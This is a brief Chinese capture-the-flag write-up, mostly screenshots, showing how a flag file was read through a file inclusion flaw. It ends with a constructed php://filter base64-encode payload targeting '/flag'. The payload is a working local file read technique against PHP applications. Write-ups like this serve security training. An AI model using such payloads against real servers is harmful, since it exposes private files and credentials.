![img](./assets/wps414.jpg)

 

输入file://flag

![img](./assets/wps415.jpg) 

 

![img](./assets/wps416.jpg) 

访问该路径

![img](./assets/wps417.jpg) 

php://filter

伪协议读取/flag

 

构造payload：

?file=php://filter/read=convert.base64-encode/resource=/flag

![img](./assets/wps418.jpg) 

 

 